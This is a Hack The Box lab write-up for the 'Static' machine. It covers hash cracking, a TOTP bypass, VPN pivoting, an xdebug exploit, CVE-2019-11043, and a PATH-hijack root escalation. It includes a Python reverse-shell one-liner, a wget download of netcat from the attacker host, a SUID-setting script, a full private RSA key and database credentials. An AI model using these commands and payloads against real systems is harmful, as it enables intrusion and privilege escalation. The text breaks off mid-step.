---
layout: writeup
category: Hack The Box
chall_description: 
points: 
solves: 
tags: Linux
date: 2024-09-06
comments: true
---

# Nmap

```bash
PORT     STATE  SERVICE      REASON         VERSION
22/tcp   open   ssh          syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCyM3ZYCZb4Brnei3KsMgp18Z1bj/LergclItE15gBjvpKqrol6BwKJoXexCMpUT+THzjpvRtKZKandJhGAqqUg+6nWzucemV1mk8X2LNvCIGdjErJSR5xBoGnXBA7zukgcZp
sM4w/WU2X3SoGlyf6oSMJUa8C/wfOIYk+HRudgrC7Z91zXTOyznUTZf/J00xXCgHXNcIWNthocAkCcE8MdYbmLU1qe0UZu/nwBgFApA6KeQAx5h4Ud91lDNq0EOF0wkbXZUuDMCMyiL8UCp4UYwLCBGYCfgYQXHqJq/GcPefRbUs/
XEE2CXSebhVsyHhtvRRBUiNZszks9enCUFGB
|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNf6FprVNh/Yi39D1fB5G7C/WiaREa9qZMAwv2jRhAz71cYsIwuBxUitj+0TjPTSG/r7+bdEEsAQmkgTxkPfrjU=
|   256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
|*ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINnml/gfiZRSzXbYCQkMsc1H84hQjJTvcB3soJtwaJNM
2222/tcp closed EtherNetIP-1 reset ttl 62
8080/tcp open   http         syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
| http-methods:
|*  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries
|_/vpn/ /.ftp_uploads/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 5.0 (94%), Linux 5.0 - 5.4 (94%), Linux 5.4 (92%), HP P2000 G3 NAS device (91%), Linux 4.15 - 5.6 (91%), Linux 5.3 - 5.4 (90%), Linux 2.6.32 (90
%), Linux 5.0 - 5.3 (90%), Linux 5.1 (90%), Ubiquiti AirOS 5.5.9 (90%)
```

When we access the http service on port 8080, a blank page shows off. When we try to access robots.txt, we're sucessfull.

![Untitled.png](Untitled.png)

We can't access vpn directory, but we can access .ftp_uploads directory

![Untitled%201.png](Untitled%201.png)

warning.txt

![Untitled%202.png](Untitled%202.png)

We downloaded db.sql.gz, but can't extract it, we got this error

![Untitled%203.png](Untitled%203.png)

Searching for these error messages, we found a possible way to be able to read the content file

[https://stackoverflow.com/questions/13149751/force-gzip-to-decompress-despite-crc-error](https://stackoverflow.com/questions/13149751/force-gzip-to-decompress-despite-crc-error)

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Machines/Static/exploitation]
└──╼ [★]$ gzip -dc db.sql.gz result
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsignint  a'n a)Co3 Nto_increment,sers name varchar(20) a'n a)Co, password varchar(40) a'n a)Co, totp varchar(16) a'n a)Co, primary key (idS iaA;
INSERT INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma, prim'admin'im'd05nade22ae348aeb5660fc2140aec35850c4da997m'd0orxxi4c7orxwwzlo'
IN
```

![Untitled%204.png](Untitled%204.png)

To fixed the .gz file, we had to downloaded fixgz app that wasn't more enable on its URL: [http://www.gzip.org/fixgz.zip](http://www.gzip.org/fixgz.zip)

So, we've gone to Wayback Machine site and get it: [http://web.archive.org/web/20150117133536/http://www.gzip.org/fixgz.zip](http://web.archive.org/web/20150117133536/http://www.gzip.org/fixgz.zip)

## Fixing db.sql.gz

We compiled fixgz.c

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Machines/Static/exploitation]
└──╼ [★]$ gcc -o fixgz fixgz.c
```

And execute the app version for linux

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Machines/Static/exploitation]
└──╼ [★]$ ./fixgz db.sql.gz db-fixed.sql.gz
```

Gunzip the file and we got the fixed db.sql.gz file

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Machines/Static/exploitation]
└──╼ [★]$ gunzip db-fixed.sql.gz

─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Machines/Static/exploitation]
└──╼ [★]$ cat db-fixed.sql 
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); 
INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
```

## Identifying the password hash

Running hash-identifier we got the right hash from this password

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Machines/Static/exploitation]                                                                                          
└──╼ [★]$ hash-identifier d033e22ae348aeb5660fc2140aec35850c4da997                                                                                                           
   #########################################################################                                                                                                 
   #     __  __                     __           ______    _____           #                                                                                                 
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #                                                                                                 
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #                                                                                                 
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #                                                                                                 
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #                                                                                                 
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #                                                                                                 
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #                                                                                                 
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```

## Cracking password

We crack the password using hashcat

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Machines/Static/exploitation]
└──╼ [★]$ hashcat -m 100 hashes/admin.hash /usr/share/wordlists/rockyou.txt

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

d033e22ae348aeb5660fc2140aec35850c4da997:admin
```

## Adding IP to our /etc/hosts

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Machines/Static]
└──╼ [★]$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       htb

10.10.10.246    static.htb
```

After this, we can access `/vpn` URL

![Untitled%205.png](Untitled%205.png)

# Brute-force Directories

Nothing in root

Found in /vpn

![Untitled%206.png](Untitled%206.png)

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Machines/Static]
└──╼ [★]$ cat gobuster/static_vpn.out
[http://static.htb:8080/vpn/src](http://static.htb:8080/vpn/src)  (Status: 301) [Size: 312] [--> [http://172.20.0.10/vpn/src/](http://172.20.0.10/vpn/src/)]
```

# Exploitation

To log into the site with the admin's creds, we have to try to turn around the 2FA. First, we have installed a Firefox's Addon named Authenticator. After we configure it with the information we got in the `db.sql` file.

After some bad moves, I just found out that my attacker machine had to be in the same time and time zone where the box was. So, for this, we made a GET request to the box with Netcat

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Static]
└──╼ [★]$ nc -v static.htb 8080
Ncat: Version 7.91 ( [https://nmap.org/ncat](https://nmap.org/ncat) )
Ncat: Connected to 10.10.10.246:8080.
GET / HTTP/1.0

HTTP/1.1 400 Bad Request
Date: Mon, 05 Jul 2021 01:54:26 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 306
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at www.static.htb Port 80</address>
</body></html>
```

![Untitled%207.png](Untitled%207.png)

And change our local time zone and time

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Static]
└──╼ [★]$ sudo timedatectl set-timezone GMT
```

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Static]
└──╼ [★]$ sudo timedatectl set-time 01:54:45
```

Then, we try to log in catch the OTP on our Authenticator add-on

![Untitled%208.png](Untitled%208.png)

Putting some name in the "Common Name" field, we got an `ovpn` generated file

![Untitled%209.png](Untitled%209.png)

Downloading and analyzing the `ovpn` file, we can get the remote server where VPNs are connected

![Untitled%2010.png](Untitled%2010.png)

So, we've added `vpn.static.htb` to our hosts file

![Untitled%2011.png](Untitled%2011.png)

Let's try to connect on VPN using our generated file

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Static/exploitation]
└──╼ [★]$ sudo openvpn web.ovpn
2021-07-05 02:25:28 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:AES-128-GCM). Future OpenVPN version will ignore --cipher for
cipher negotiations. Add 'AES-256-CBC' to --data-ciphers or change --cipher 'AES-256-CBC' to --data-ciphers-fallback 'AES-256-CBC' to silence this warning.
2021-07-05 02:25:28 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2021
2021-07-05 02:25:28 library versions: OpenSSL 1.1.1k  25 Mar 2021, LZO 2.10
```

![Untitled%2012.png](Untitled%2012.png)

Now, we have access to the network segment 172.30.0.1 - vpn

![Untitled%2013.png](Untitled%2013.png)

And our route table is

![Untitled%2014.png](Untitled%2014.png)

Now, let's scan this segment to find open ports in possible hosts

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Static/exploitation/vpn-segment]
└──╼ [★]$ sudo nmap -v -sS --open 172.30.0.1-15
Starting Nmap 7.91 ( [https://nmap.org](https://nmap.org/) ) at 2021-07-05 02:33 GMT
Initiating Ping Scan at 02:33
Scanning 14 hosts [4 ports/host]
Completed Ping Scan at 02:33, 6.19s elapsed (14 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:33
Completed Parallel DNS resolution of 1 host. at 02:33, 0.03s elapsed
Initiating Parallel DNS resolution of 1 host. at 02:33
Completed Parallel DNS resolution of 1 host. at 02:33, 0.02s elapsed
Initiating SYN Stealth Scan at 02:33
Scanning 172.30.0.1 [1000 ports]
Discovered open port 22/tcp on 172.30.0.1
Completed SYN Stealth Scan at 02:33, 4.08s elapsed (1000 total ports)
Nmap scan report for 172.30.0.1
Host is up (0.28s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
```

We have found one host (172.30.0.1) with port 22 (SSH) open. Let's try to log in with our admin credentials

![Untitled%2015.png](Untitled%2015.png)

We aren't successful. Let's try to add those IPs  on the panel login to our route table

## Adding web IP

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Static/exploitation/vpn-segment]
└──╼ [★]$ sudo ip route add 172.20.0.10 via 172.30.0.1
```

![Untitled%2016.png](Untitled%2016.png)

![Untitled%2017.png](Untitled%2017.png)

## Adding Database IP

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Static/exploitation/vpn-segment]
└──╼ [★]$ sudo ip route add 172.20.0.11 via 172.30.0.1
```

![Untitled%2018.png](Untitled%2018.png)

![Untitled%2019.png](Untitled%2019.png)

## Port scanning on web IP

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Static/exploitation/web-segment]
└──╼ [★]$ sudo nmap -vv -A -Pn -p 80 -oA webvpn 172.20.0.10
```

![Untitled%2020.png](Untitled%2020.png)

![Untitled%2021.png](Untitled%2021.png)

We got the `xdebug` version

![Untitled%2022.png](Untitled%2022.png)

## Exploitation

### Exploit

[https://github.com/gteissier/xdebug-shell](https://github.com/gteissier/xdebug-shell)

[https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

Sending a request using curl

```bash
─[us-dedivip-1]─[10.10.16.173]─[jpfguedes@htb]─[~/htb/Static/exploitation/web-segment]
└──╼ [★]$ curl '[http://172.20.0.10/vpn/panel.php?XDEBUG_SESSION_START=PHPSTORM](http://172.20.0.10/vpn/panel.php?XDEBUG_SESSION_START=PHPSTORM)' -H "X-Forwarded-For: 172.30.0.9"
```

And editing the exploit to bring the `/etc/passwd` file

![Untitled%2023.png](Untitled%2023.png)

We've got the base64 encode data

![Untitled%2024.png](Untitled%2024.png)

![Untitled%2025.png](Untitled%2025.png)

Decoding that string, we have

```bash
─[us-dedivip-1]─[10.10.16.173]─[jpfguedes@htb]─[~/htb/Static/exploitation/web-segment]
└──╼ [★]$ echo 'd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovaG9tZS93d3ctZGF0YTovYmluL2Jhc2g=' | base64 -d
www-data:x:33:33:www-data:/home/www-data:/bin/bash
```

Now, let's try to verify and get the id_rsa private key from the `.ssh` directory

```bash
─[us-dedivip-1]─[10.10.16.173]─[jpfguedes@htb]─[~/htb/Static/exploitation/web-segment]
└──╼ [★]$ curl '[http://172.20.0.10/vpn/panel.php?XDEBUG_SESSION_START=PHPSTORM](http://172.20.0.10/vpn/panel.php?XDEBUG_SESSION_START=PHPSTORM)' -H "X-Forwarded-For: 172.30.0.9"
```

![Untitled%2026.png](Untitled%2026.png)

And we got id_rsa private key

```bash
─[us-dedivip-1]─[10.10.16.200]─[jpfguedes@htb]─[~/htb/Static/exploitation/user]
└──╼ [★]$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
QEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s/rcQYgl3i
VKmls3lsod8ilakdDoYEYt12L4ST/exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnj
mL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi
17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQA
cw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjl
pXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9
ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZj
GqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQf
j60myPuxl4qgY8O2yqLFUH3/ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWA
Amvx+AECgYEA6OOd9dgqXR/vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpK
qbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh/Kdls23Ny
gxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg
+1CfGEH/N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcq
te1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7C
CFdjXCI3SIlvc8miyivjRHoyJYJz/cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1
Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP/d/l+TH7RI+0RIc54a7y1c
PkOhzKlqfQSnwmwgAg1YYWi/vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFv
aIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGE
yhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p/KXwvVy
/LaJiVM/BgUCmhxdL0YNP2ZUxuAgeAdM0/e52time8DNkhefyLntlhnqp6hsEqtR
zzXBAoGBANB6Wdk/X3riJ50Bia9Ai7/rdXUpAa2B4pXARnP1/tw7krfPM/SCMABe
sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
-----END RSA PRIVATE KEY-----
```

Now, we login with www-data on 172.20.0.10

![Untitled%2027.png](Untitled%2027.png)

Searching for some files, we could get the `database.php` file on `/var/www/html/vpn/`

![Untitled%2028.png](Untitled%2028.png)

### Credentials DB

`root:2108@C00l`

## Port scanning on database IP

```bash
─[us-dedivip-1]─[10.10.16.232]─[jpfguedes@htb]─[~/htb/Static/exploitation]
└──╼ [★]$ sudo nmap -vv -A -Pn -p 3306 -oA db-segment/nmap/dbip 172.20.0.11
```

![Untitled%2029.png](Untitled%2029.png)

## Enumeration pki `(192.168.254.3)`

Running an `ifconfig` command, we got

```bash
www-data@web:/tmp$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet 172.20.0.10  netmask 255.255.255.0  broadcast 172.20.0.255
ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)
RX packets 9910  bytes 862941 (862.9 KB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 8725  bytes 5919884 (5.9 MB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255
ether 02:42:c0:a8:fe:02  txqueuelen 0  (Ethernet)
RX packets 46152  bytes 2493734 (2.4 MB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 46135  bytes 3414011 (3.4 MB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
inet 127.0.0.1  netmask 255.0.0.0
loop  txqueuelen 1000  (Local Loopback)
RX packets 36  bytes 1890 (1.8 KB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 36  bytes 1890 (1.8 KB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

As we can see, we have access to the network segment where that Pki machine is connected.

![Untitled%2030.png](Untitled%2030.png)

Let's try to using wget to access the possible HTTP service on host PKI

```bash
www-data@web:/tmp$ wget [http://192.168.254.3](http://192.168.254.3/)
--2021-07-07 01:48:50--  [http://192.168.254.3/](http://192.168.254.3/)
Connecting to 192.168.254.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘index.html’

index.html                                      [ <=>                                                                                     ]      53  --.-KB/s    in 0s

2021-07-07 01:48:50 (5.40 MB/s) - ‘index.html’ saved [53]

www-data@web:/tmp$ cat index.html
batch mode: /usr/bin/ersatool create|print|revoke CN
```

Using `wget` with `-d`, for debug, we got the request's header

```bash
www-data@web:/tmp$ wget -d [http://192.168.254.3](http://192.168.254.3/)
```

![Untitled%2031.png](Untitled%2031.png)

Now, we got the php-fpm version. Searching for vulnerabilities, we've found a CVE that leads us to an RCE when php-fpm isn't properly configured on Nginx web server

### CVE

- `CVE-2019-11043`

### Exploits

[https://github.com/neex/phuip-fpizdam](https://github.com/neex/phuip-fpizdam)

[https://github.com/huowen/CVE-2019-11043](https://github.com/huowen/CVE-2019-11043)

Using port forwarding with SSH, we redirect port 80 from 192.168.254.3 (PKI) to our attack box on port 8081 and access it via browser

```bash
─[us-dedivip-1]─[10.10.16.200]─[jpfguedes@htb]─[~/htb/Static/exploitation/user]
└──╼ [★]$ ssh -i id_rsa -L 8081:192.168.254.3:80 [www-data@172.20.0.10](mailto:www-data@172.20.0.10)
```

![Untitled%2032.png](Untitled%2032.png)

![Untitled%2033.png](Untitled%2033.png)

## PoC

![Untitled%2034.png](Untitled%2034.png)

![Untitled%2035.png](Untitled%2035.png)

Now we'll send netcat to the host web and then we'll running our reverse shell

```bash
www-data@web:/tmp$ wget [http://172.30.0.9:8000/nc.traditional](http://172.30.0.9:8000/nc.traditional)
--2021-07-07 17:55:05--  [http://172.30.0.9:8000/nc.traditional](http://172.30.0.9:8000/nc.traditional)
Connecting to 172.30.0.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 34952 (34K) [application/octet-stream]
Saving to: ‘nc.traditional’

nc.traditional        100%[=======================>]  34.13K  71.0KB/s    in 0.5s

2021-07-07 17:55:07 (71.0 KB/s) - ‘nc.traditional’ saved [34952/34952]
```

## Reverse shell

```bash
/usr/bin/python3.6 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

Running the payload above, we've got a shell on host PKI

![Untitled%2036.png](Untitled%2036.png)

# Privilege Escalation

Trying to verify what is the ersatool that showed off on index.html from HTTP service on pki host, we could see that this file is an ELF 64-bit, a Linux binary

![Untitled%2037.png](Untitled%2037.png)

Using the strings tool, we found some interesting source code inside the binary

![Untitled%2038.png](Untitled%2038.png)

![Untitled%2039.png](Untitled%2039.png)

Trying to find the source-code file named ersatool.c and other possible ersatool*

```bash
www-data@pki:/dev/shm$ find / -name "ersatool.*" 2>/dev/null
```

![Untitled%2040.png](Untitled%2040.png)

Trying to read ersatool.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <libgen.h>
#include <sys/wait.h>
#include <ctype.h>

//easyrsa configuration
char ERSA_DIR[]="/opt/easyrsa";
char TA_KEY[]="/opt/easyrsa/clients/ta.key";
char OUTPUT_DIR[]="/opt/easyrsa/clients";
char BASE_CONFIG[]="/opt/easyrsa/clients/base.conf";
char EXT[]=".ovpn";

//void printCN(char*,int);
void filePrint(char*);
void revokeCN(char*,int);
void createCN(char*,int);
void integrateCN(char*);
void getHelp(char*,int);
void cleanStr(char*);

//deprecated function - prints the CN ovpn config file
//conf file can be printed with inegrateCN(); <- create
void printCN(char *cn, int i){
        char fn[100];
        char buffer[100];

        if(i==1){
                printf("print->CN=");
                fflush(stdout);
                memset(buffer,0,sizeof(buffer));
                read(0,buffer,sizeof(buffer));
        }
        else {
                memset(buffer,0,sizeof(buffer));
                strncat(buffer,cn,sizeof(buffer));
        }

        if(!strncmp("\n",buffer,1)) { return; }

        do{
                strncpy(fn, OUTPUT_DIR,sizeof(fn));
                strncat(fn, "/",sizeof(fn)-strlen(fn));
                strncat(fn, strtok(basename(buffer),"\n"),sizeof(fn)-strlen(fn));
                strncat(fn, EXT, sizeof(fn)-strlen(fn));
                printf(buffer); //checking buffer content
                filePrint(fn);
                if(i==1){

                        printf("\nprint->CN=");
                        fflush(stdout);
                        memset(buffer,0,sizeof(buffer));
                        read(0,buffer,sizeof(buffer));
                }
        } while (strncmp("\n",buffer,1) && i==1);
}

void filePrint(char *filename){
        int bfsiz=1;
        char buffer[bfsiz];
        int fd;
        ssize_t fr;
        memset(buffer,0,bfsiz);
        setuid(0); //escalating privileges to read root owned files
        if((fd=open(filename,O_RDONLY))<0){
                printf("[!] ERR reading %s!\n",filename);
        }
        while(fr=read(fd,buffer,bfsiz)>0){
                printf("%s",buffer);
                memset(buffer,0,bfsiz);
        }
        close(fd);
        fflush(stdout);
}

void revokeCN(char *cn, int i){
        puts("[!] Not implemented");
        fflush(stdout);
}

//creates and prints new CN config file
void createCN(char *cn, int i){
        int devNull, sout, serr, pid, status, oid;
        char EASYRSA[50];
        char buffer[100];
        char CMD[100];
        char WD[50];

        memset(EASYRSA,0,sizeof(EASYRSA));
        strcat(EASYRSA,ERSA_DIR);
        strcat(EASYRSA,"/easyrsa");

        if(i==1){
                printf("create->CN=");
                fflush(stdout);
                memset(buffer,0,sizeof(buffer));
                read(0,buffer,sizeof(buffer));
        }
        else {
                memset(buffer,0,sizeof(buffer));
                strncat(buffer, cn, sizeof(buffer));
        }

        if(!strncmp("\n",buffer,1)) { return; }

        do{
                pid = vfork();
                if(pid==0){
                        char *a[] = {EASYRSA,"build-client-full",strtok(basename(buffer),"\n"),"nopass","batch"};
                        //forge the command string
                        cleanStr(a[2]);
                        sprintf(CMD,"%s %s %.20s %s %s",a[0],a[1],a[2],a[3],a[4]);
                        sout=dup(STDOUT_FILENO);
                        serr=dup(STDERR_FILENO);
                        devNull=open("/dev/null",O_WRONLY);
                        dup2(devNull,STDOUT_FILENO);
                        dup2(devNull,STDERR_FILENO);
                        setuid(0); //escalating privilges to generate required files
                        chdir(ERSA_DIR);
                        system(CMD);
                        exit(0);
                }
                dup2(sout,STDOUT_FILENO);
                dup2(serr,STDERR_FILENO);
                close(devNull);
                usleep(500000);
                integrateCN(buffer);

                if(i==1){
                        printf("create->CN=");
                        fflush(stdout);
                        memset(buffer,0,sizeof(buffer));
                        read(0,buffer,sizeof(buffer));
                }
        } while (strncmp("\n",buffer,1) && i==1);
}

//print valid ovpnfile for provided cn
void integrateCN(char *cn){
        char PKI_DIR[50];
        char KEY_DIR[50];
        char CRT_DIR[50];
        char CA_CERT[50];
        char CN_CERT[50];
        char CN_KEY[50];

        memset(PKI_DIR,0,sizeof(PKI_DIR));
        memset(KEY_DIR,0,sizeof(KEY_DIR));
        memset(CRT_DIR,0,sizeof(CRT_DIR));
        memset(CA_CERT,0,sizeof(CA_CERT));
        memset(CN_CERT,0,sizeof(CN_CERT));
        memset(CN_KEY,0,sizeof(CN_KEY));

        strcat(PKI_DIR,ERSA_DIR);
        strcat(PKI_DIR,"/pki");
        strcat(KEY_DIR,PKI_DIR);
        strcat(KEY_DIR,"/private");
        strcat(CRT_DIR,PKI_DIR);
        strcat(CRT_DIR,"/issued");
        strcat(CA_CERT,PKI_DIR);
        strcat(CA_CERT,"/ca.crt");
        strcat(CN_CERT,CRT_DIR);
        strcat(CN_CERT,"/");
        strcat(CN_CERT,basename(cn));
        strcat(CN_CERT,".crt");
        strcat(CN_KEY,KEY_DIR);
        strcat(CN_KEY,"/");
        strcat(CN_KEY,basename(cn));
        strcat(CN_KEY,".key");

        filePrint(BASE_CONFIG);

        printf("<ca>\n");
        filePrint(CA_CERT);
        printf("</ca>\n");

        printf("<cert>\n");
        filePrint(CN_CERT);
        printf("</cert>\n");

        printf("<key>\n");
        filePrint(CN_KEY);
        printf("</key>\n");

        printf("key-direction 1\n<tls-auth>\n");
        filePrint(TA_KEY);
        printf("</tls-auth>\n");
        fflush(stdout);
}

void getHelp(char *prog, int i){
        if(i==1) {
                printf("create|print|revoke|exit\n");
                fflush(stdout);
        }
        else{
                printf("batch mode: %s create|print|revoke CN\n",prog);
                fflush(stdout);
                exit(255);
        }
}

//clean non alphanum chars from string to secure
void cleanStr(char *str)
{
    unsigned long i = 0;
    unsigned long j = 0;
    char c;

    while ((c = str[i++]) != '\0')
    {
        if (isalnum(c))
        {
            str[j++] = c;
        }
    }
    str[j] = '\0';
}

int main(int argc, char **argv){
        int interactive=0;
        char opt[8];
        char *cn;

        if(argc!=3 && argc!=1){
                getHelp(argv[0],interactive);
        }
        else if(argc==1){
                interactive=1;
                printf("# ");
                fflush(stdout);
                memset(opt,0,sizeof(opt));
                read(0,opt,sizeof(opt));
                cn=NULL;
        }
        else {
                strncpy(opt,argv[1],sizeof(opt));
                cn=argv[2];
        }

        do      {
                if(!strncmp("revoke",opt,6)){
                        revokeCN(cn,interactive);
                }
                else if (!strncmp("print",opt,5)){
                        printCN(cn,interactive);
                }
                else if (!strncmp("create",opt,6)){
                        createCN(cn,interactive);
                }
                else if (!strncmp("exit",opt,4)){
                        exit(0);
                }
                else{
                        getHelp(argv[0], interactive);
                }

                if(interactive==1){
                        memset(opt,0,sizeof(opt));
                        printf("# ");
                        fflush(stdout);
                        memset(opt,0,sizeof(opt));
                        read(0,opt,sizeof(opt));
                }
        } while(interactive==1);
}
```

There is a line in this code that could led us to a privilege escalation to the root

![Untitled%2041.png](Untitled%2041.png)

Executing pspy64 on machine and when we go to the application and generate an ovpn file, we notice that, in this process, the ersatool executes the openssl binary without passing the full path of the binary.

So, it could lead us to a path variable hijacking.

[https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)

First we create a file named openssh 

```bash
#!/bin/bash
chmod u+s /bin/bash
```

After we copy this file to the pki host

```bash
─[us-dedivip-1]─[10.10.16.200]─[jpfguedes@htb]─[~/htb/Static/exploitation/user]
└──╼ [★]$ cat openssl | base64
